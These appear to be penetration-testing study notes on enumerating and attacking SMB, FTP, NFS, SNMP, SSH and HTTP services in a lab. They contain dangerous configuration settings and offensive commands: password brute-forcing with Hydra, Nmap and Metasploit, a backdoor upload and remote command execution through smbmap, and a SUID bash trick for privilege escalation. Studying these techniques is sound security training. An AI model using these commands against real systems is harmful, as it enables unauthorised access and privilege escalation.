	> There is an alternative variant to the SMB server, called Samba, developed for Unix-based operating system. Samba implements the Common Internet File System (CIFS) network protocol. CIFS is a "dialect" of SMB. In other words, CIFS is a very specific implementation of the SMB protocol, which in turn was created by Microsoft. This allows Samba to communicate with newer Windows systems. Therefore, it usually is referred to as SMB / CIFS. However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports 137, 138, 139, but CIFS uses TCP port 445 only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures.
	SMB Version	Supported				Features
	CIFS		Windows NT 4.0				Communication via NetBIOS interface
	SMB 1.0		Windows 2000				Direct connection via TCP
	SMB 2.0		Windows Vista, Windows Server 2008	Performance upgrades, improved message signing, caching feature
	SMB 2.1		Windows 7, Windows Server 2008 R2	Locking mechanisms
	SMB 3.0		Windows 8, Windows Server 2012		Multichannel connections, end-to-end encryption, remote storage access
	SMB 3.0.2	Windows 8.1, Windows Server 2012 R2	
	SMB 3.1.1	Windows 10, Windows Server 2016		Integrity checking, AES-128 encryption

	> With version 3, the Samba server gained the ability to be a full member of an Active Directory domain. With version 4, Samba even provides an Active Directory domain controller. It contains several so-called daemons for this purpose - which are Unix background programs. The SMB server daemon (smbd) belonging to Samba provides the first two functionalities, while the NetBIOS message block daemon (nmbd) implements the last two functionalities. The SMB service controls these two background programs.

	> We know that Samba is suitable for both Linux and Windows systems. In a network, each host participates in the same workgroup. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an application programming interface (API) for networking computers called the Network Basic Input/Output System (NetBIOS). The NetBIOS API provided a blueprint for an application to connect and share data with other computers. In a NetBIOS environment, when a machine goes online, it needs a name, which is done through the so-called name registration procedure. Either each host reserves its hostname on the network, or the NetBIOS Name Server (NBNS => https://networkencyclopedia.com/netbios-name-server-nbns/) is used for this purpose. It also has been enhanced to Windows Internet Name Service (WINS => https://networkencyclopedia.com/windows-internet-name-service-wins/).
	[+] Default configuration ==> https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html
		> cat /etc/samba/smb.conf | grep -v "#\|\;"
		Setting				Description
		[sharename]			The name of the network share.
		workgroup = WORKGROUP/DOMAIN	Workgroup that will appear when clients query.
		path = /path/here/		The directory to which user is to be given access.
		server string = STRING		The string that will show up when a connection is initiated.
		unix password sync = yes	Synchronize the UNIX password with the SMB password?
		usershare allow guests = yes	Allow non-authenticated users to access defined shared?
		map to guest = bad user		What to do when a user login request doesn't match a valid UNIX user?
		browseable = yes		Should this share be shown in the list of available shares?
		guest ok = yes			Allow connecting to the service without using a password?
		read only = yes			Allow users to read files only?
		create mask = 0700		What permissions need to be set for newly created files?
	[+] Dangerous settings
		Setting				Description
		browseable = yes		Allow listing available shares in the current share?
		read only = no			Forbid the creation and modification of files?
		writable = yes			Allow users to create and modify files?
		guest ok = yes			Allow connecting to the service without using a password?
		enable privileges = yes		Honor privileges assigned to specific SID?
		create mask = 0777		What permissions must be assigned to the newly created files?
		directory mask = 0777		What permissions must be assigned to the newly created directories?
		logon script = script.sh	What script needs to be executed on the user's login?
		magic script = script.sh	Which script should be executed when the script gets closed?
		magic output = script.out	Where the output of the magic script needs to be stored?
	> Restart Samba
		sudo systemctl restart smbd
	> List files
		smbclient -N -L //192.168.188.138
	> Execute commands with smbclient
		Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (!<cmd>) without interrupting the connection.
			!cat pre-prod.txt
	> From the administrative point of view, we can check these connections using smbstatus. Apart from the Samba version, we can also see who, from which host, and which share the client is connected. This is especially important once we have entered a subnet (perhaps even an isolated one) that the others can still access. For example, with domain-level security, the samba server acts as a member of a Windows domain. Each domain has at least one domain controller, usually a Windows NT server providing password authentication. This domain controller provides the workgroup with a definitive password server. The domain controllers keep track of users and passwords in their own Security Authentication Module (SAM) and authenticate each user when they log in for the first time and wish to access another machine's share.

	[+] Nmap
		❯ sudo nmap 192.168.188.138 -sV -sC -p139,445
	
	> We can see from the results that it is not very much that Nmap provided us with here. Therefore, we should resort to other tools that allow us to interact manually with the SMB and send specific requests for the information. One of the handy tools for this is rpcclient. This is a tool to perform MS-RPC functions. The Remote Procedure Call (RPC) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value. ==> https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/

		rpcclient -U "" 192.168.188.138
			Query			Description
			srvinfo			Server information.
			enumdomains		Enumerate all domains that are deployed in the network.
			querydominfo		Provides domain, server, and user information of deployed domains.
			netshareenumall		Enumerates all available shares.
			netsharegetinfo <share>	Provides information about a specific share.
			enumdomusers		Enumerates all domain users.
			queryuser <RID>		Provides information about a specific user.
			querydispinfo

	> Brute forcing User RIDs
		With loop in bash
			for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
		With samrdump.py
			samrdump.py 192.168.188.138	
	> We could also use:
		smbmap -H 10.129.14.128
		crackmapexec smb 10.129.14.128 --shares -u '' -p ''
		enum4linux-ng
			git clone https://github.com/cddmp/enum4linux-ng.git
			cd enum4linux-ng
			pip3 install -r requirements.txt
			./enum4linux-ng.py 192.168.188.138 -A



* Creating network shares is fairly easy. Generally, users just need to turn on the:
    	> 'File and Printer Sharing' service
    	[+] Starting from Windows Vista, users can choose to share:
    		> Single file
    		  	They can choose local or remote users to share the file with
    		> Public directory
    		  	They can choose which local users can access the files on the share, but they can ONLY allow everyone or no one in the network to access the share

    		> UNC Paths
    			An authorized user can access shares by using Universal Naming Convention paths. The format of a UNC path is:
    		  		\\ServerName\ShareName\file.txt

    		> Administrative shares
    			There are also some special default administrative shares which are used by system administrators and Windows itself:
    				\\ComputerName\C$ 
    		    			Lets an administrator access a volume on the local machine. Every volume has a share (C$, D$, E$, etc)
    		    		\\ComputerName\admin$
    		    			Points to the windows installation directory
    		    		\\ComputerName\ipc$ 
    		    			Is used for inter-process communication. You cannot browse it via Windows Explorer. The IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares
* Enumerating Windows Shares
	> In Windows OS 
    		> nbtstat -A <target IP> //Displays information about a target
    		  	Example of results
    		  		ELS-WINXP <00> UNIQUE Registered 
    		  	    	ELS-WINXP <20> UNIQUE Registered 
    		  	    		  <00> : Tells us that ELS-WINXP is a workstation 
    		  	    	UNIQUE: This computer must have only one IP address assigned
    		  	    		  <20> : Tells us that the file sharing service is up and running on the machine.
    		> net view <target IP>
    	> In LinuxOS 
    		> nbmlookup -A <target IP>
    	    		If <20>, there is a server that we can actually connect to it.
    		> smbclient -L //<IP> -N //It also displays administrative shares that are hidden when using Windows standard tools
		  smbclient \\\\10.129.42.253\\users -U bob
    	  	> nbtscan -r 192.168.188.0/24

* Null sessions: Nowadays Windows is configured to be inmune from this kind of attack. However, legacy hosts can still be vulnerable. Check it:
  	> In Windows
  		net use \\<target IP address>\IPC$ '' /u:'' //IPC$ is an example
  	> In Linux
  	  	smbclient //<target IP address>/IPC$ -N
  	> We could automate this:
  	  	while IFS= read -r users; do smbclient //demo.ine.local/$users -N;done < users.txt
  	> Instead of downloading the file locally, we could see it with the '-'. This parameter is the local file where the content of remote file must be saved.
  	  	get flag_1 -

	[+] Exploiting Null sessions
  	  	> With Windows
  	  		> Using Enum (https://packetstormsecurity.com/search/?q=win32+enum&s=files)      
  	  			enum -S <target IP> //Enumerate the shares of a machine. Administrative shares too.
  	  		    	enum -U <target IP> //Enumerate users
  	  		    	enum -P <target IP> //If you need to mount a network authentication attack, you can check the password policy.
  	  		> Using Winfo (https://packetstormsecurity.com/search/?q=winfo&s=files)
  	  			winfo <target IP> -n //To use null session

  	  	> With Linux
  	  		enum4linux
  	  			-U  get userlist
  	  			-M  get machine list
  	  		    	-N  get namelist dump (different from -U and-M)
  	  		    	-S  get sharelist
  	  		    	-P  get password policy information
  	  		    	-G  get group and member list
  	  		    	-a  all of the aboveIFS (full basic enumeration)
  	  		    	-I  get about LDAP running on the server
  	  		    	-i  printer information
  	  		    	-n  nbmlookup
				-o	Get OS information
  	  		    	-s  brute force gwhiuessing for share names // /usr/share/enum4linux/share-list.txt // ~/Desktop/wordlists/100-common-passwords.txt
    	  		enum4linux -r -u "admin" -p "password1" 192.168.188.128 //Search for users

		> Impacket-samrdump
  	  		impacket-samrdump <target IP>

  	  	> Nmap
  	  		nmap --script=smb-enum-shares <target IP >
  	  		nmap --script=smb-enum-users <target IP>
  	  		nmap --script=smb-bute <target IP>

		> In Windows machine
    			net use z: \\192.168.188.128\c$ /u:admin passloquesea
    	  		net use * /delete
    	  		net use z: \\192.168.188.128\c$ /u:admin * [This is for not type the password]
    	Nmap scripts
    		nmap -p445 --script smb-protocols 192.168.188.128
    	  	--script smb-security-mode
    	  	nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 192.168.188.138
    	  	smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 
    	smbmap
    		smbmap -H 10.129.2.5 -u null
    	  	smbmap -u guest -p "" -d . -H 192.168.188.128
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -x ipconfig
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -L //List all drives on the specified host
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -r 'C$'
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 --upload 'root/backdoortohackyou' 'C$\backdoor'
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 --download 'C$\flag.txt'
    	  	smbmap -H 10.129.117.106 -R --depth 5
    	msfconsole
    		use auxiliary/scanner/smb/smb_version
    	  	use auxiliary/scanner/smb/smb2
    	  	use auxiliary/scanner/smb/smb_enumshares
    	  	use auxiliary/scanner/smb/smb_login ==> Brute force
    	  	  set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
    	  	  set smbuser
    	  	use auxiliary/scanner/smb/pipe_auditor
    	rpcclient
    	  	rpcclient -U "" -N 192.168.188.128 -c "enumdomusers"
    	  	srvinfo
    	  	lookupnames admin

####FTP
* The File Transfer Protocol (FTP) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as HTTP or POP. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.
* Let us imagine that we want to upload local files to a server and download other files using the FTP protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through TCP port 21. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via TCP port 20. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.
* A distinction is made between active and passive FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the passive mode has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.


* FTP commands
	https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/
	COMMAND		WHAT IT DOES
	!		Runs the specified command on the local computer
	?		Displays descriptions for ftp commands
	append		Appends a local file to a file on the remote computer
	ascii		Sets the file transfer type to ASCII, the default
	bell		Toggles a bell to ring after each file transfer command is completed (default = OFF)
	binary		Sets the file transfer type to binary
	bye		Ends the FTP session and exits ftp
	cd		Changes the working directory on the remote computer
	close		Ends the FTP session and returns to the command interpreter
	debug		Toggles debugging (default = OFF)
	delete		Deletes a single file on a remote computer
	dir		Displays a list of a remote directory’s files and subdirectories
	disconnect	Disconnects from the remote computer, retaining the ftp prompt
	get		Copies a single remote file to the local computer
	glob		Toggles filename globbing (wildcard characters) (default = ON)
	hash		Toggles hash sign (#) printing for each data block transferred (default = OFF)
	help		Displays descriptions for ftp commands
	lcd		Changes the working directory on the local computer
	literal		Sends arguments, verbatim, to the remote FTP server
	ls		Displays an abbreviated list of a remote directory’s files and subdirectories
	mdelete		Deletes one or more files on a remote computer
	mdir		Displays a list of a remote directory’s files and subdirectories
	mget		Copies one or more remote files to the local computer
	mkdir		Creates a remote directory
	mls		Displays an abbreviated list of a remote directory’s files and subdirectories
	mput		Copies one or more local files to the remote computer
	open		Connects to the specified FTP server
	prompt		Toggles prompting (default = ON)
	put		Copies a single local file to the remote computer
	pwd		Displays the current directory on the remote computer (literally, “print working directory”)
	quit		Ends the FTP session with the remote computer and exits ftp (same as “bye”)
	quote		Sends arguments, verbatim, to the remote FTP server (same as “literal”)
	recv		Copies a remote file to the local computer
	remotehelp	Displays help for remote commands
	rename		Renames remote files
	rmdir		Deletes a remote directory
	send		Copies a local file to the remote computer (same as “put”)
	status		Displays the current status of FTP connections
	trace		Toggles packet tracing (default = OFF)
	type		Sets or displays the file transfer type (default = ASCII)
	user		Specifes a user to the remote computer
	verbose		Toggles verbose mode (default = ON)
* FTP command line
	COMMAND	WHAT IT DOES
	-v		Suppresses verbose display of remote server responses.
	-n		Suppresses auto login
	-i		Turns off interactive prompting during multiple file transfers.
	-d		Enables debugging, displaying all ftp commands passed between the client and server.
	–g		Disables filename globbing, which permits the use of wildcard chracters in local file and path names.
	-s:filename	Specifies a text file containing ftp commands; the commands will automatically run after ftp starts. No spaces are allowed in this parameter. Use this switch instead of redirection (>).
	-a		Use any local interface when binding data connection.
	-w:windowsize	Overrides the default transfer buffer size of 4096.
	-computer	Specifies the computer name or IP address of the remote computer to connect to. The computer, if specified, must be the last parameter on the line.
* FTP server status codes
	https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes
* TFTP
	> Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between client and server processes. However, it does not provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses UDP, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.

	> This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user's authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks
	> Unlike the FTP client, TFTP does not have directory listing functionality.
	> Few commands
		Commands	Description
		connect		Sets the remote host, and optionally the port, for file transfers.
		get		Transfers a file or set of files from the remote host to the local host.
		put		Transfers a file or set of files from the local host onto the remote host.
		quit		Exits tftp.
		status		Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.
		verbose		Turns verbose mode, which displays additional information during file transfer, on or off.
* Default configuration
	> One of the most used FTP servers on Linux-based distributions is vsFTPd. The default configuration of vsFTPd can be found in /etc/vsftpd.conf, and some settings are already predefined by default. The configuration file does not contain all possible settings that can be made
	❯ cat /etc/vsftpd.conf  | grep -v '#'
	Setting							Description
	listen=NO						Run from inetd or as a standalone daemon?
	listen_ipv6=YES						Listen on IPv6 ?
	anonymous_enable=NO					Enable Anonymous access?
	local_enable=YES					Allow local users to login?
	dirmessage_enable=YES					Display active directory messages when users go into certain directories?
	use_localtime=YES					Use local time?
	xferlog_enable=YES					Activate logging of uploads/downloads?
	connect_from_port_20=YES				Connect from port 20?
	secure_chroot_dir=/var/run/vsftpd/empty			Name of an empty directory
	pam_service_name=vsftpd					This string is the name of the PAM service vsftpd will use.
	rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem	The last three options specify the location of the RSA certificate to use for SSL encrypted connections.
	rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key	
	ssl_enable=NO
	> In addition, there is a file called /etc/ftpusers that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. In the following example, the users guest, john, and kevin are not permitted to log in to the FTP service, even if they exist on the Linux system
	[+] With vsFTPd, the optional(http://vsftpd.beasts.org/vsftpd_conf.html)settings that can be added to the configuration file for the anonymous login look like this.Dangerous settings!!
	Setting				Description
	anonymous_enable=YES		Allowing anonymous login?
	anon_upload_enable=YES		Allowing anonymous to upload files?
	anon_mkdir_write_enable=YES	Allowing anonymous to create new directories?
	no_anon_password=YES		Do not ask anonymous for password?
	anon_root=/home/username/ftp	Directory for anonymous.
	write_enable=YES		Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?

* After connecting
	status
	debug
	trace
* Other settings
	Setting	Description	Setting	Description
	dirmessage_enable=YES	Show a message when they first enter a new directory?	
	chown_uploads=YES	Change ownership of anonymously uploaded files?	
	chown_username=username	User who is given ownership of anonymously uploaded files.
	local_enable=YES	Enable local users to login?
	chroot_local_user=YES	Place local users into their home directory?
	chroot_list_enable=YES	Use a list of local users that will be placed in their home directory?
	hide_ids=YES		All user and group information in directory listings will be displayed as "ftp".
	ls_recurse_enable=YES	Allows the use of recurse listings.
	
	> If the hide_ids=YES setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded. This setting is a security feature to prevent local usernames from being revealed. With the usernames, we could attack the services like FTP and SSH and many others with a brute-force attack in theory. However, in reality, fail2ban solutions are now a standard implementation of any infrastructure that logs the IP address and blocks all access to the infrastructure after a certain number of failed login attempts.

	> Another helpful setting we can use for our purposes is the ls_recurse_enable=YES. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.
		ls -R
* Downloading files from such an FTP server is one of the main features, as well as uploading files created by us. This allows us, for example, to use LFI vulnerabilities to make the host execute system commands. Apart from the files, we can view, download and inspect. Attacks are also possible with the FTP logs, leading to Remote Command Execution (RCE). This applies to the FTP services and all those we can detect during our enumeration phase.
	get Important\ Notes.txt ==> One file
	wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136 ==> Download all available files
* Next, we can check if we have the permissions to upload files to the FTP server. Especially with web servers, it is common that files are synchronized, and the developers have quick access to the files. FTP is often used for this purpose, and most of the time, configuration errors are found on servers that the administrators think are not discoverable. The attitude that internal network components cannot be accessed from the outside means that the hardening of internal systems is often neglected and leads to misconfigurations. The ability to upload files to the FTP server connected to a web server increases the likelihood of gaining direct access to the webserver and even a reverse shell that allows us to execute internal system commands and perhaps even escalate our privileges.
	put testupload.txt

* Nmap
	> Update this databse of NSE scripts
		sudo nmap --script-updatedb
	> Find nmap FTP scripts
		find / -type f -name ftp* 2>/dev/null | grep scripts
		ftp-anon ==> anonymous access
		ftp-syst ==> STAT command
	--script-trace ==> This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server
    	nmap 192.168.188.128 --script ftp-brute --script-args userdb=/root/users -p 21
    	anonymous login
    		nmap 192.20.26.3 -p21 --script ftp-anon
* Service interaction
	nc -nv 10.129.14.136 21
	telnet 10.129.14.136 21
	openssl s_client -connect 10.129.14.136:21 -starttls ftp
		The SSL certificate allows us to recognize the hostname, for example, and in most cases also an email address for the organization or company. In addition, if the company has several locations worldwide, certificates can also be created for specific locations, which can also be identified using the SSL certificate.
* FTP
	ftp -p 10.129.42.254 
	ftp 192.168.188.128
* Hydra
    	brute force with
    	  	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.188.128 ftp

####SAMBA
* SAMBA utilizes username and password authentication in order to obtain access to the server or a network share
	hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 smb
####NFS
* Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (NFSv3), which has been in use for many years, authenticates the client computer, this changes with NFSv4. Here, as with the Windows SMB protocol, the user must authenticate.
* Versions
	Version	Features
	NFSv2	It is older but is supported by many systems and was initially operated entirely over UDP.
	NFSv3	It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.
	NFSv4	It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.
* NFS version 4.1 (RFC 8881) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port 2049 is used to run the service, which simplifies the use of the protocol across firewalls.

* NFS is based on the Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC) protocol exposed on TCP and UDP ports 111, which uses External Data Representation (XDR) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options. The authorization is taken from the available information of the file system where the server is responsible for translating the user information supplied by the client to that of the file system and converting the corresponding authorization information as correctly as possible into the syntax required by UNIX.

* The most common authentication is via UNIX UID/GID and group memberships, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.

[+] Default configuration
	> NFS is not difficult to configure because there are not as many options as FTP or SMB have. The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients. The NFS Exports Table shows which options it accepts and thus indicates which options are available to us ==> http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html

		cat /etc/exports
* Additional options
	> The default exports file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets

		Option			Description
		rw			Read and write permissions.
		ro			Read only permissions.
		sync			Synchronous data transfer. (A bit slower)
		async			Asynchronous data transfer. (A bit faster)
		secure			Ports above 1024 will not be used.
		insecure		Ports above 1024 will be used.
		no_subtree_check	This option disables the checking of subdirectory trees.
		root_squash		Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.
	[+] Example
		echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
		systemctl restart nfs-kernel-server
		exportfs
[+] Dangerous settings
	Option		Description
	rw		Read and write permissions.
	insecure	Ports above 1024 will be used ==> This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.
	nohide		If another file system was mounted below an exported directory, this directory is exported by its own exports entry.
	no_root_squash	All files created by root are kept with the UID/GID 0.
[+] Nmap
	sudo nmap 10.129.14.128 -p111,2049 -sV -sC
	sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

* Once we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system. 
	> Show availabale NFS shares
		showmount -e 10.129.14.128
	> Mounting NFS share
		mkdir target-NFS
		mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
		cd target-NFS
		tree .
* List contents with usernames & group names
	ls -l mnt/nfs/
	ls -n mnt/nfs/
* It is important to note that if the root_squash option is set, we cannot edit the backup.sh[a example file] file even as root.

* Privesc
	> We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the SUID of that user and then run the shell via the SSH user.

* Unmounting
	cd ..
	umount ./target-NFS

* Other commands
  	sudo apt install nfs-common
  	sudo mount -t nfs IP:share /tmp/mount/ -nolock
  	/usr/sbin/showmount -e 10.10.236.98: To list the NFS shares
 	./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
 	sudo chown root /home/andres/Downloads/bash
 	sudo chmod +s

####DNS
* Types of DNS servers
Server Type		Description
> DNS Root Server	The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe.
Authoritative Nameserver	Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.
Non-authoritative Nameserver	Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.
Caching DNS Server	Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.
Forwarding Server	Forwarding servers perform only one function: they forward DNS queries to another DNS server.
Resolver	Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.




####SNMP
SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.
	snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
	snmpwalk -v 2c -c private  10.129.42.253
* Tools ==> Brute force
	> onesixtyone : Can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool
		https://github.com/trailofbits/onesixtyone
		onesixtyone -c dict.txt 10.129.42.254
####SSH
* SSH can also be used to access Windows host and is now native to Windows 10 since version 1809. 
* SSH authentication can be configured in two ways:
	> Username & password authentication
      	> Key based authentication
    	> Examples:
		use auxiliary/scanner/ssh/ssh_version
		ssh 192.168.188.128 22
    		version? 
    		  	nc 192.168.188.128
    		algorithms that can be used to create the key?
    		  	nmap 192.168.188.128 -p22 --script ssh-enum-algos
    		  	ssh -vv 192.168.188.128
    		get ssh server key fingerprint
    		  	nmap 192.168.188.128 -p22 --script ssh-hostkey --script-args ssh_hostkey=full
    		  	ssh-keyscan host | ssh-keygen -lf -
		[+] Auth methods
    			nmap 192.168.188.128 -p22 --script ssh-auth-methods --script-args "ssh.user=admin"
    		[+] Dictionary attack
    		  	nmap 192.168.188.128 -p22 --script ssh-brute --scritp-args userdb=/root/user 
		[+] Metasploit
    		  	auxiliary/scanner/ssh/ssh_login
    		    		set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
		[+] Other example: We see the reported version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.1. 
			From inspection of other Ubuntu SSH package changelogs(https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog), we see the release version takes the format 1:7.3p1-1ubuntu0.1. 
			Updating our version to fit this format, we get 1:8.2p1-4ubuntu0.1. 
			In Google ==> '1:8.2p1-4ubuntu0.1 release' ==>  A quick search for this version online reveals that it is included in Ubuntu Linux Focal Fossa 20.04
			In Google ==> 'Ubuntu Linux Focal Fossa 20.04 release date'


####HTTP
* GET /index.html HTTP/1.1 to retrieve the page index.html or GET / HTTP/1.1 to retrieve the default page.
* HTTP is a stateles protocol. Every request is completely unrelated to the ones preceding and following it.
* The cookie jar is the storage space where a web browser stores the cookies. When a web server installs a cookie, it sets the domain field. Then, the browser will use the cookie for every request sent to that domain and all its subdomains. If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie host-only flag; this means that the cookie will be sent only to that precise hostname
* -ign_eof
* Websites running PHP install session cookies by using the ==> PHPSESSID, JSP websites use ==> JSESSIONID
* Each development language has its own default session parameter name. Of course, the web developer can also choose to use a custom parameter name
* Session IDs can also be transmitted via GET requests ==> http://example.site/resource.php?sessid=s423ndsd
* Parameter http-only is very important for no access by javascript(document.cookie),java,etc.
* Expires ==> session [expires after close the browser ]
####Fingerprinting with Netcat
* It does not work with encryption
	nc -v www.ferrari.com 80 | GET / HTTP/1.1 Host:www.ferrari.com //Remember that every HTTP request has two empty lines between the header and the body of the reques itself
  	nc -lvnp 8888 (Server) ==> echo 'hello' | nc -v localhost 8888
  	nv example.com 80
  	  HEAD / HTTP/1.0 and hit enter 2 times.
  	  -u : UDP connection
  	  -v : To notify you after the connection to the server
  	  -k : Keep listening after client disconnects
  	  -z: zero I/O

####Fingerprinting with OpenSSL
	openssl s_client -connect hack.me:443 -debug | -state | -quiet and after that OPTIONS HTTP/1.1 Host: hack.me
	openssl x509 -in twitter.com-cert -noout -text
	openssl s_client -connect target.site:443
	HEAD / HTTP/1.0

####Fingerprinting with Httprint
* It uses a signature-based technique to indentify web servers
	httprint -P0 -h <target hosts> -s <signature file>
	-P0 to avoid pinging the host (most web servers do not respond to ping echo requests)

####HTTP methods (Some of them)
* If you use HTTP/1.0, you can skip the Host: header
* OPTIONS (Used to query the web server for enabled HTTP Verbs)
	OPTIONS / HTTP/1.1
    	Host: www.example.site

	curl -X OPTIONS 192.45.178.3 -v

* GET (To request a resource)
	GET /page.php HTTP/1.1 //You can also passa arguments like ==> ... /page.php?course=PTS...
    	Host: www.example.site

    	curl -X GET 192.45.178.3

* POST (To submit HTML form data. POST parameters must be in the message body)
	POST /login.php HTTP/1.1
    	Host: www.example.site

    	username=john&password=mypass

    	curl -X POST 192.45.178.3
    	curl -X POST 192.45.178.3/login.php -d "name=m1l0js&password=m1l0js" -v

* HEAD (Very similar to GET, as it asks just headers of the response instead of the response body)
	HEAD / HTTP/1.1
    	Host: www.example.site

    	curl -I 192.45.178.3
